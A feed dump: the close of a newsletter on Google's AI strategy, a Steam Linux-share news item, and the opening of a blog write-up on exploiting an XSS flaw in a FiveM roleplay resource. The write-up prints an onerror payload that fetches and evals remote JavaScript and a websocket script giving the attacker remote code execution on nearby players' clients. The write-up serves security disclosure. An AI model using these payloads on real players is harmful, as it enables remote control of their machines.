products Google has offered, from its branding to actual deployment in the field.</p><p>Vertex is now coalescing into its direct competitor with Azure AI studio and Amazon Bedrock by making multiple models available and serving a wide variety of use cases. Google is betting on its premiere experience and expertise in AI to face down Microsoft and Amazon in its first real fight for its life. At the same time it’s playing a complicated game of side chess against OpenAI to build a powerful foundation model and make it widely available with PaLM 2—and then eventually its multi-modal next-gen model Gemini.</p><p>And a subtle announcement with Nvidia on stage may signal another surprising—and critical—double-down to re-capture what it has ceded in TensorFlow. It comes in the form of a new language model development framework, PaxML, built on top of Google’s cutting-edge AI framework: JAX.</p><p>But we’ll get to that in a second. To better understand what’s at stake here for Google, let’s take a quick trip through some of its history of dropping the ball with its very first revolutionary technology, MapReduce.</p><p>Google has historically employed a mishmash of highly skilled scientists and engineers flanked by an army of product managers, designers, and others that have historically had only secondary authority to the company's technical talent.&nbsp;That’s changed over time, but Google has traditionally been considered an engineering-first organization.</p><p><span>This served the company&nbsp;</span><em>very</em><span>&nbsp;well for a very long time. Google's pioneering technology enabled it to crawl and index the entire Web into a single source of truth with Google Search. Most of Google's technical search achievements came on top of a computational breakthrough in its ability to manage massive amounts of data: MapReduce.</span></p><p><span>Jeff Dean, still currently at Google, and Sanjay Ghemawat in the early 2000s co-authored&nbsp;</span><a href="https://static.googleusercontent.com/media/research.google.com/en//archive/mapreduce-osdi04.pdf" rel="">a paper on the MapReduce</a><span> technique&nbsp;to efficiently create a framework for managing massive data sets—the kind Google needed for a search engine.&nbsp; Rather than make this available to the public, however, Google largely kept the technology in-house. </span></p><p>Run by engineers, the team essentially did not foresee the coming wave of open-source technology to power the modern Web and the companies that would come to commercialize it. It was the first of many unforced errors in its relationship with the open source developer community, as Doug Cutting and Mike Cafarella replicated the technology in 2006 in the form of Hadoop. That open source tool then became the general standard for managing large amounts of data, an enormous missed opportunity for Google.</p><p>Google's challenges continued with the release of TensorFlow, which once again became the de-facto standard in machine learning tools upon launch. It both enabled and inspired a new generation of AI-powered products and use cases. But it was missing many pieces that made it more developer-friendly and allowed Meta to swoop in with its own deep learning framework, PyTorch.</p><p>Google once again found itself caught flat-footed and quickly tried to tack on some of the features that made PyTorch popular (like eager execution). But it’s largely ceded its dominance in the developer community to PyTorch. While there are still many organizations using TensorFlow, PyTorch has captured the momentum of the machine learning developer community.</p><p>Eight Google alumni then released the Transformers paper in 2017, paving the way for modern generative AI that has since exploded since the public launch of ChatGPT. Transformers was widely considered a step change in AI, making the creation and deployment of large language models computationally feasible and practical.</p><p>The story should sound familiar at this point. Google let its dominance—at least for now—in AI slip through the cracks with OpenAI coming out with its GPT-series models up to GPT-3. And in November last year, the floodgates for AI opened up with the launch of ChatGPT and its successor, GPT-4.</p><p>It wasn’t just OpenAI either: Meta released a plenty-potent language model using the same technique pioneered by Google. Today it stands on the precipice of having missed the boat in AI with its rapid and clumsy releases of AI tools like Bard.</p><p>The final piece of Google’s strategy today came in the form of a subtle, and very vague, announcement from Nvidia CEO Jensen Huang on stage in a brief appearance of only a few minutes. Huang announced that Google and Nvidia had been collaborating with a new language model development framework, PaxML, built on top of Google’s cutting-edge machine learning framework JAX and its Accelerated Linear Algebra framework (or XLA).</p><p>“The work we’ve done to create frameworks that allow us to push the frontiers of models distributed across giant infrastructures to save time for AI researchers, scale up, save money, save energy—all that requires cutting edge computer science,” Huang said on stage.</p><p><span>JAX is a result of  of the company's dependency internally on TPUs and XLA—the latter of&nbsp;</span><a href="https://cloud.google.com/blog/products/ai-machine-learning/googles-open-source-momentum-openxla-new-partnerships" rel="">which was&nbsp;</a><em><a href="https://cloud.google.com/blog/products/ai-machine-learning/googles-open-source-momentum-openxla-new-partnerships" rel="">also</a></em><a href="https://cloud.google.com/blog/products/ai-machine-learning/googles-open-source-momentum-openxla-new-partnerships" rel="">&nbsp;open-sourced in October last year to relatively little fanfare</a><span>. It represents a tantalizing opportunity: the ability to efficiently distribute massive training tasks across a wide array of hardware in parallel in the middle of a hardware shortage and ballooning training costs.</span></p><p>While you’ll be hard pressed to find JAX in the wild, my understanding is a number of forward-thinking generative AI companies are using it. JAX represents the opportunity to rethink a training system from scratch and make it incredibly efficient. In particular, you could space out training across different types of hardware—hence the announcement with Huang on stage.</p><p><span>PaxML also represents a really interesting hedge for Nvidia. PyTorch is largely dependent on Cuda, Nvidia’s machine learning development framework, which has placed Nvidia on the throne for AI. Its NeMo and Triton represent a series of moves to lock into AI development workflows. There is already one large startup, </span><a href="https://www.modular.com/" rel="">Modular</a><span>, building a developer framework to break AI’s addiction to Cuda—</span><a href="https://www.reuters.com/technology/ai-startup-modular-raises-100-mln-general-catalyst-led-funding-2023-08-24/" rel="">and it recently raised at a $600 million valuation led by General Catalyst</a><span>.</span></p><p>Depending on how it plays out, PaxML could very easily be Google’s attempt to break JAX into the mainstream by way of Nvidia. Google already has a massive store of processing power with its TPU—and announced an updated one today—but has also made a big bet on Nvidia hardware by making H100 graphics hardware available on Google Cloud. PaxML represents an interesting opportunity to go to developers and say, hey, we can offer you a much larger amount of compute than AWS or Azure.</p><p>Google is now making its play in AI in the form of pushing Vertex AI into a competitive category with Azure (and by extension OpenAI) and AWS. And while it’s incredibly early, it’s possible its collaboration with Nvidia on PaxML could have pretty substantial ramifications for AI development as a whole.</p><p>We’re now just past the six-year anniversary of the release of the Transformers paper. TensorFlow launched in 2015, followed quickly by PyTorch. And it was roughly around that six-year mark—in 2021—that the class of modern machine learning infrastructure came about and raised at multi-billion dollar valuations. And they are, for the most part, PyTorch shops.</p><p>And we are starting to see requests for JAX experience alongside PyTorch in job descriptions. Some AI models, when released, come out with both PyTorch and JAX weights. It’s still incredibly early here, but there is a lot of opportunity—particularly with Nvidia throwing its weight behind JAX and XLA.</p><p>The largest user of TPUs has, historically, been Google itself as it now swaps JAX in to many of its foundational products. They’ve largely been freely available to Googlers as a perk internally, though my understanding is hardware constraints have made them more difficult to secure.</p><p><span>But a TPU, optimized for XLA and JAX, running in parallel to Nvidia GPUs on a widely available infrastructure powering </span><em>many</em><span> kinds of AI models in the form of Vertex AI, represents a very tantalizing opportunity for Google.</span></p><p>With Google clearing out its industry debt in the form of a more unified Vertex AI and a potential major bet on JAX, it stands to bring itself back into direct competition after spending the last year tripping over itself. We’ll now see if that’s enough to keep it from dropping the ball in AI for the third time.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.supervised.news/p/mapreduce-tensorflow-bard-also-hello?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://www.supervised.news/p/mapreduce-tensorflow-bard-also-hello?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p><strong><a href="https://www.theverge.com/2023/8/29/23849056/google-meet-ai-duet-attend-for-me" rel="">Google Meet’s new AI will be able to go to meetings for you (The Verge)</a></strong><span>: Google’s quest to turn Duet into a personal AI assistant continues in the form of creating a meeting buddy that lets you ignore your meetings. Most meetings didn’t have to be meetings in the first place, but this is at least a way to pretend that it was important for whomever called the meeting together in the first place.</span></p><p><strong><a href="https://www.deepmind.com/blog/identifying-ai-generated-images-with-synthid" rel="">Identifying AI-generated images with SynthID (DeepMind)</a></strong><span>: One of the single-biggest challenges the industry faces is finding some way to identify whether a piece of content was generated by AI or a real human. Most of the tools have turned out to be highly </span><em>in</em><span>effective, but watermarking has generally been seen as one workaround for it. One shot at that is coming out of DeepMind in the form of SynthID, a watermarking system for identify whether an image was generated by a generative AI model.</span></p><p><strong><a href="https://techcrunch.com/2023/08/29/google-cloud-announces-the-5th-generation-of-its-custom-tpus/" rel="">Google Cloud announces the 5th generation of its custom TPUs (TechCrunch)</a></strong><span>: Google is coming out with an updated TPU that it says doubles the last version’s performance-per-dollar (that’s a weird one) in training. At the same time, Nvidia is working with Google to put its hardware inside Google Cloud. It’s pretty clear Google sees a future where both of these kinds of hardware work in tandem, and it’ll continue to put out new versions of its own processor.</span></p><p><strong><a href="https://www.theverge.com/2023/8/29/23819494/apple-september-event-iphone-15-pro-watch-ultra-date" rel="">Apple announces the iPhone 15 launch event (The Verge)</a></strong><span>: So this is more of a product-y thing usually, but I really think Apple is going to be making some kind of AI-type announcement here because </span><em>it simply has to</em><span>. Apple has been working on GPT-ish models internally and clearly has a lot of interest getting one onto a phone. While it usually reserves its software updates for WWDC in the summer, it wouldn’t be surprising to see a generative model end up exclusively on new iPhones in the form of something like “you need the newest neural engine to use it.”</span></p><p><strong><a href="https://openai.com/blog/introducing-chatgpt-enterprise" rel="">Introducing ChatGPT Enterprise (OpenAI)</a></strong><span>: OpenAI is implementing its semi-expected two-tiered approach for GPT-4 by launching a new enterprise tier. It talks about a large number of the kind of table stakes-y features needed for most enterprises around security and privacy, but really this comes down to rate limiting. OpenAI says the enterprise tier gets double the performance and unlimited usage—which basically seems like code for “you won’t get rate limited or see performance degradation.”</span></p><p><em>If you have any tips, please send me a note at m@supervised.news or contact me directly on Signal at +1-415-690-7086. As always, please send any and all feedback my way.</em></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux overtakes Mac as Steam's second-most used OS, thanks to the Steam Deck (239 pts)]]></title>
            <link>https://www.pcgamer.com/linux-overtakes-mac-as-steams-second-most-used-os-and-its-all-thanks-to-the-steam-deck/</link>
            <guid>37312001</guid>
            <pubDate>Tue, 29 Aug 2023 18:37:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.pcgamer.com/linux-overtakes-mac-as-steams-second-most-used-os-and-its-all-thanks-to-the-steam-deck/">https://www.pcgamer.com/linux-overtakes-mac-as-steams-second-most-used-os-and-its-all-thanks-to-the-steam-deck/</a>, See on <a href="https://news.ycombinator.com/item?id=37312001">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="article-body">
<p>Linux has surpassed macOS as the second-most used operating system on Steam according to the latest <a href="https://store.steampowered.com/hwsurvey/" target="_blank" data-url="https://store.steampowered.com/hwsurvey/">Steam Hardware &amp; Software Survey</a> from July. While Linux remains a distant second place to top dog Windows, it's still seen a rapid increase in adoption among Steam users almost entirely attributable to the Linux-based Steam Deck.</p><p>As <a href="https://arstechnica.com/gadgets/2023/08/linux-surpasses-the-mac-among-steam-gamers/" target="_blank" data-url="https://arstechnica.com/gadgets/2023/08/linux-surpasses-the-mac-among-steam-gamers/">Ars Technica</a> points out, the Deck's SteamOS version of Linux accounts for a whopping 42% of reported <a href="https://store.steampowered.com/hwsurvey/?platform=linux" target="_blank" data-url="https://store.steampowered.com/hwsurvey/?platform=linux">Linux users on Steam</a>, with Arch Linux lagging far behind in second place at 7.94% adoption. Windows still absolutely dominates the overall field at 96.21% of users, with all versions of Linux at 1.96% and macOS hanging out down at 1.84%.</p><p>It's another feather in the cap of the Deck, which is consistently one of the best-selling items on Steam overall, currently holding down the #6 spot according to <a href="https://steamdb.info/stats/globaltopsellers/" target="_blank" data-url="https://steamdb.info/stats/globaltopsellers/">SteamDB</a>. As for Linux more broadly, I do wonder if the Deck's success will spur more adoption of the more hardcore, DIY OS ecosystem.&nbsp;</p><p>A friend of mine who's dabbled in being a Linux Guy was excited about the Steam Deck's prospects of improving Linux-based gaming more broadly, and the Proton compatibility layer Valve developed for the Deck certainly seems like a game changer for the <a href="https://www.gamingonlinux.com/" target="_blank" data-url="https://www.gamingonlinux.com/">Gaming on Linux</a> crowd.</p><p>In my own personal experience though, loving the Steam Deck didn't make me into a Linux Guy, it just made me into a Steam Deck Guy. Still, everybody wins here. Linux Guys get all kinds of new options with Proton, and I get to play Baldur's Gate 3 on my upcoming international flight⁠—be sure to check out our guide to playing <a href="https://www.pcgamer.com/baldurs-gate-3-steam-deck-compatibility-performance/" target="_blank">Baldur's Gate 3 on Steam Deck</a> if you're having trouble running Larian's massive new RPG on the handheld.</p>
</div><div data-hydrate="true" id="slice-container-newsletterForm-articleInbodyContent"><section><p>Sign up to get the best content of the week, and great gaming deals, as picked by the editors.</p></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hacking GTA V RP Servers Using Web Exploitation Techniques (124 pts)]]></title>
            <link>https://www.nullpt.rs/hacking-gta-servers-using-web-exploitation</link>
            <guid>37311975</guid>
            <pubDate>Tue, 29 Aug 2023 18:35:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nullpt.rs/hacking-gta-servers-using-web-exploitation">https://www.nullpt.rs/hacking-gta-servers-using-web-exploitation</a>, See on <a href="https://news.ycombinator.com/item?id=37311975">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>As of 2023, Grand Theft Auto V remains the second best-selling video game at 185,000,000 units sold, second to Minecraft<sup><a href="#user-content-fn-earnings" id="user-content-fnref-earnings" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup>.
Its success can largely be attributed to the game's online multiplayer mode, GTA Online, which allows players to explore a sandboxed
world with friends and strangers alike. Although the playable world and content is vast, the experience is quickly degraded due to the
peer-to-peer nature of the game. The client-sided nature of the game allows for a plethora of exploits, including the ability to crash
players, spawn vehicles, and even corrupt other's accounts. The lack of player-led servers also means that the game
can not be modded in the traditional sense.</p>
<figure><video width="320" height="240" controls=""><source src="https://www.nullpt.rs/posts/hacking-gta-servers-using-web-exploitation-techniques/hackers.mp4" type="video/mp4"><p>Your browser does not support the video tag.</p></video><figcaption>Hackers ruining the GTA Online experience</figcaption></figure>
<h2>Introducing FiveM</h2>
<p>FiveM is an open source third-party multiplayer mod by Cfx.re<sup><a href="#user-content-fn-cfx-acquired" id="user-content-fnref-cfx-acquired" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>, which allows players to create or connect to dedicated servers.
These servers can be modded to the creator's liking, and can be used to create custom game modes, maps, and otherwise impossible experiences.
A popular example of this is roleplay servers, which allows players to roleplay as civilians, police officers, and criminals.
These experiences are created with game modifications known as "resources". Resources on a roleplay server can be used to allow for the
custom creation of vehicles, custom interiors &amp; exteriors, drug-dealing mechanics, and more.</p>
<p>These resources can built using Lua, C#, or JavaScript. A typical setup would use Lua to handle server-side actions and JavaScript to display
custom user interfaces. These scripts communicate through <a href="https://docs.fivem.net/docs/scripting-manual/nui-development/">NUI</a> callbacks which allow interoperability between the Chromium Embedded Framework that
renders the custom interfaces and the Lua scripting engine.</p>
<h2>Finding Servers</h2>
<figure><img alt="FiveM server list" sizes="100vw" srcset="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=640&amp;q=75 640w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=750&amp;q=75 750w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=828&amp;q=75 828w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=1080&amp;q=75 1080w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=1200&amp;q=75 1200w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=1920&amp;q=75 1920w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=2048&amp;q=75 2048w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=3840&amp;q=75 3840w" src="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fserver-list.png&amp;w=3840&amp;q=75" width="100" height="100" decoding="async" data-nimg="1" loading="lazy"><figcaption>FiveM server list</figcaption></figure>
<p>FiveM aggregates a list of servers that can be filtered by various criteria such as name, region, player count, etc...
Selecting a server allows you to view it in more detail, revealing the list of resources, and allowing you to connect
through the click of a button.</p>
<figure><img alt="Detailed server view" sizes="100vw" srcset="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=640&amp;q=75 640w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=750&amp;q=75 750w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=828&amp;q=75 828w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=1080&amp;q=75 1080w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=1200&amp;q=75 1200w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=1920&amp;q=75 1920w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=2048&amp;q=75 2048w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=3840&amp;q=75 3840w" src="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fdetailed-list.png&amp;w=3840&amp;q=75" width="100" height="100" decoding="async" data-nimg="1" loading="lazy"><figcaption>Detailed server view</figcaption></figure>
<p>After viewing several servers from this list, <code>rcore_radiocar</code> was a resource that piqued my interest. This allowed
players to specify YouTube and SoundCloud links to broadcast music from the player's car to other nearby players.</p>
<p>My initial thought was, it may be possible to leak player's IPs by specifying a URL that I controlled. To my surprise,
this worked. I wasn't yet sure of how this resource worked under the hood and since it was paid I couldn't easily sift
through the source. Or so I thought.</p>
<h2>CEF Remote Debugging</h2>
<p>FiveM exposes the CEF Remote Debugging interface on <code>localhost:13172</code>. This allows us to inspect and debug the resource's
code for handling the user interface with ease. Each resource is loaded into its own <code>iframe</code>.</p>
<figure><img alt="Debugging the Chromium Embedded Framework view of a FiveM server" sizes="100vw" srcset="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=640&amp;q=75 640w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=750&amp;q=75 750w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=828&amp;q=75 828w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=1080&amp;q=75 1080w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=1200&amp;q=75 1200w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=1920&amp;q=75 1920w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=2048&amp;q=75 2048w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=3840&amp;q=75 3840w" src="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fcef.png&amp;w=3840&amp;q=75" width="100" height="100" decoding="async" data-nimg="1" loading="lazy"><figcaption>Debugging the Chromium Embedded Framework view of a FiveM server</figcaption></figure>
<p>A quick peek into the resource we're curious about reveals a relatively straightforward file tree.</p>
<pre><code><span>rcore_radiocar
</span><span>└── html
</span><span>    ├── css
</span><span>    │&nbsp;&nbsp; ├── reset.css
</span><span>    │&nbsp;&nbsp; └── style.css
</span><span>    ├── index.html
</span><span>    └── scripts
</span><span>        ├── SoundPlayer.js
</span><span>        ├── class.js
</span><span>        ├── functions.js
</span><span>        ├── listener.js
</span><span>        └── vue.min.js
</span></code></pre>
<p>A peek into <code>SoundPlayer.js</code> reveals the functionality for how the music gets played on the client-side.
This logic is handled inside of the <code>create()</code> function:</p>
<pre><code><span><span>create</span><span>(</span><span>)</span>
</span><span>	<span>{</span>
</span><span>        <span>// ...</span>
</span><span>	    <span>var</span> link <span>=</span> <span>getYoutubeUrlId</span><span>(</span><span>this</span><span>.</span><span>getUrlSound</span><span>(</span><span>)</span><span>)</span><span>;</span>
</span><span>        <span>if</span><span>(</span>link <span>===</span> <span>""</span><span>)</span>
</span><span>        <span>{</span>
</span><span>            <span>this</span><span>.</span><span>isYoutube</span> <span>=</span> <span>false</span><span>;</span>
</span><span>
</span><span>            <span>this</span><span>.</span><span>audioPlayer</span> <span>=</span> <span>new</span> <span>Howl</span><span>(</span><span>{</span>
</span><span>                <span>src</span><span>:</span> <span>[</span><span>this</span><span>.</span><span>getUrlSound</span><span>(</span><span>)</span><span>]</span><span>,</span>
</span><span>                <span>loop</span><span>:</span> <span>false</span><span>,</span>
</span><span>                <span>html5</span><span>:</span> <span>true</span><span>,</span>
</span><span>                <span>autoplay</span><span>:</span> <span>false</span><span>,</span>
</span><span>                <span>volume</span><span>:</span> <span>0.0</span><span>,</span>
</span><span>                <span>format</span><span>:</span> <span>[</span><span>'mp3'</span><span>]</span><span>,</span>
</span><span>                <span>onend</span><span>:</span> <span>function</span><span>(</span><span>event</span><span>)</span><span>{</span>
</span><span>                    <span>ended</span><span>(</span><span>null</span><span>)</span><span>;</span>
</span><span>                <span>}</span><span>,</span>
</span><span>                <span>onplay</span><span>:</span> <span>function</span><span>(</span><span>)</span><span>{</span>
</span><span>                    <span>isReady</span><span>(</span><span>"nothing"</span><span>,</span> <span>true</span><span>)</span><span>;</span>
</span><span>                <span>}</span><span>,</span>
</span><span>            <span>}</span><span>)</span><span>;</span>
</span><span>            <span>$</span><span>(</span><span>"#"</span> <span>+</span> <span>this</span><span>.</span><span>div_id</span><span>)</span><span>.</span><span>remove</span><span>(</span><span>)</span><span>;</span>
</span><span>            <span>$</span><span>(</span><span>"body"</span><span>)</span><span>.</span><span>append</span><span>(</span><span>"&lt;div id = '"</span><span>+</span> <span>this</span><span>.</span><span>div_id</span> <span>+</span><span>"' style='display:none'&gt;"</span><span>+</span><span>this</span><span>.</span><span>getUrlSound</span><span>(</span><span>)</span> <span>+</span><span>"&lt;/div&gt;"</span><span>)</span>
</span><span>        <span>}</span>
</span><span>        <span>else</span>
</span><span>        <span>{</span>
</span><span>            <span>// ...</span>
</span><span>        <span>}</span>
</span><span>	<span>}</span>
</span></code></pre>
<p>The resource attempts to extract a YouTube ID from the URL (e.g: extract <code>D7DVSZ_poHk</code> from <code>https://www.youtube.com/watch?v=D7DVSZ_poHk</code>).
If an ID cannot be extracted, it is treated as an unknown source and uses audio library <a href="https://howlerjs.com/">Howler.js</a> to parse and play
the audio. Afterwards, the resource <em>graciously</em> appends our sound's URL to the DOM using JQuery's <code>append</code> function.</p>
<p>If it wasn't immediately obvious, this screams vulnerable to XSS. Since the user is able to specify any URL, an attacker is
able to craft an XSS payload and execute arbitrary JavaScript on player's machines.</p>
<p>To test this theory, I crafted an XSS payload that did exactly this. Using a purposefully erroneous <code>img</code> tag, we're able to use the <code>onerror</code>
attribute to fetch a larger payload and execute it using JavaScript's <code>eval</code> function.</p>
<p>The XSS payload reads as such:</p>
<pre><code><span><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>"</span>#<span>"</span></span> <span><span>onerror</span><span><span>=</span><span>'</span><span><span>fetch</span><span>(</span><span><span>`</span><span>https://[redacted].com/payload.js</span><span>`</span></span><span>)</span><span>.</span><span>then</span><span>(</span><span>res</span><span>=&gt;</span>res<span>.</span><span>text</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>r</span><span>=&gt;</span><span>eval</span><span>(</span>r<span>)</span><span>)</span><span>)</span></span><span>'</span></span></span> <span><span>style</span><span><span>=</span><span>"</span><span><span>display</span><span>:</span>none</span><span>"</span></span></span> <span>/&gt;</span></span>
</span></code></pre>
<p>The actual loaded payload contains logic to connect the player to a websocket that I control so that we're able to feed arbitrary
JavaScript through a control panel.</p>
<p>The injected payload reads as follows:</p>
<pre><code><span>globalThis<span>.</span><span>serverName</span> <span>=</span> <span>'default'</span><span>;</span>
</span><span>globalThis<span>.</span><span>lastPing</span> <span>=</span> <span>Date</span><span>.</span><span>now</span><span>(</span><span>)</span>
</span><span>
</span><span><span>const</span> <span>sendMessage</span> <span>=</span> <span>(</span><span>socket<span>,</span> message</span><span>)</span> <span>=&gt;</span> socket<span>.</span><span>send</span><span>(</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span>message<span>)</span><span>)</span><span>;</span>
</span><span>
</span><span><span>const</span> <span>pingCommand</span> <span>=</span> <span>(</span><span>_<span>,</span> socket</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>  globalThis<span>.</span><span>lastPing</span> <span>=</span> <span>Date</span><span>.</span><span>now</span><span>(</span><span>)</span><span>;</span>
</span><span>  <span>sendMessage</span><span>(</span>socket<span>,</span> <span>{</span> <span>type</span><span>:</span> <span>"pong"</span> <span>}</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span><span>
</span><span><span>const</span> <span>evalCommand</span> <span>=</span> <span>(</span><span><span>{</span> code <span>}</span><span>,</span> socket</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>  <span>const</span> returned <span>=</span> <span>eval</span><span>(</span>code<span>)</span><span>;</span> <span>// Execute the code sent from our server on the player's machine</span>
</span><span>  <span>sendMessage</span><span>(</span>socket<span>,</span> <span>{</span> <span>type</span><span>:</span> <span>"evaled"</span><span>,</span> <span>returned</span><span>:</span> <span><span>`</span><span><span>${</span>returned<span>}</span></span><span>`</span></span> <span>}</span><span>)</span><span>;</span>
</span><span><span>}</span><span>;</span>
</span><span>
</span><span>globalThis<span>.</span><span>commands</span> <span>=</span> <span>{</span>
</span><span>  <span>eval</span><span>:</span> evalCommand<span>,</span>
</span><span>  <span>ping</span><span>:</span> pingCommand<span>,</span>
</span><span><span>}</span>
</span><span>
</span><span>globalThis<span>.</span><span>start</span> <span>??=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>  <span>if</span> <span>(</span>globalThis<span>.</span><span>socket</span><span>)</span> <span>{</span>
</span><span>    <span>return</span><span>;</span>
</span><span>  <span>}</span>
</span><span>
</span><span>  <span>const</span> socket <span>=</span> <span>new</span> <span>WebSocket</span><span>(</span><span><span>`</span><span>wss://[redacted]/connect/</span><span><span>${</span>globalThis<span>.</span><span>serverName</span><span>}</span></span><span>`</span></span><span>)</span><span>;</span>
</span><span>  globalThis<span>.</span><span>socket</span> <span>=</span> socket<span>;</span>
</span><span>
</span><span>  <span>const</span> <span>closed</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>    globalThis<span>.</span><span>socket</span> <span>=</span> <span>undefined</span><span>;</span>
</span><span>    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> globalThis<span>.</span><span>start</span><span>(</span><span>)</span><span>,</span> <span>500</span><span>)</span>
</span><span>  <span>}</span><span>;</span>
</span><span>  socket<span>.</span><span>onclose</span> <span>=</span> closed<span>;</span>
</span><span>  socket<span>.</span><span>onerror</span> <span>=</span> closed<span>;</span>
</span><span>  socket<span>.</span><span>onmessage</span> <span>=</span> <span>(</span><span><span>{</span> data <span>}</span></span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>    <span>if</span> <span>(</span><span>!</span>data<span>)</span> <span>return</span><span>;</span>
</span><span>
</span><span>    <span>const</span> <span>{</span> type<span>,</span> <span>...</span>rest <span>}</span> <span>=</span> <span>JSON</span><span>.</span><span>parse</span><span>(</span>data<span>)</span><span>;</span>
</span><span>    globalThis<span>.</span><span>commands</span><span>[</span>type<span>]</span><span>?.</span><span>(</span>rest<span>,</span> socket<span>)</span><span>;</span>
</span><span>  <span>}</span><span>;</span>
</span><span><span>}</span>
</span><span>
</span><span>globalThis<span>.</span><span>start</span><span>(</span><span>)</span><span>;</span>
</span></code></pre>
<p>The only thing left was to test this. The plan goes as follows:</p>
<ol>
<li>Find a server with the <code>xsound</code> and <code>rcore_radiocar</code> resource.</li>
<li>Get inside of a vehicle</li>
<li>Run the <code>/radiocar</code> command and drop the XSS payload</li>
<li>Profit???</li>
</ol>
<p>Now, a video demonstrating the exploit:</p>
<figure><video width="320" height="240" controls=""><source src="https://www.nullpt.rs/posts/hacking-gta-servers-using-web-exploitation-techniques/xss-demo.mp4" type="video/mp4"><p>Your browser does not support the video tag.</p></video><figcaption>XSS payload being dropped and tested using various scripts</figcaption></figure>
<p>As I roam the city in my car, nearby players are attempting to play the music from the URL being
broadcasted by my car. Since this "URL" is a maliciously crafted payload, they are instead connecting
to my websocket awaiting further command.</p>
<h2>Further commands</h2>
<p>FiveM exposes various functions to the CEF browser. One handy function, <code>window.invokeNative</code>, can be used to
execute certain tasks in C++-land. A peek into <code>components/nui-core/src/NUICallbacks_Native.cpp</code> tells us what
we can do.</p>
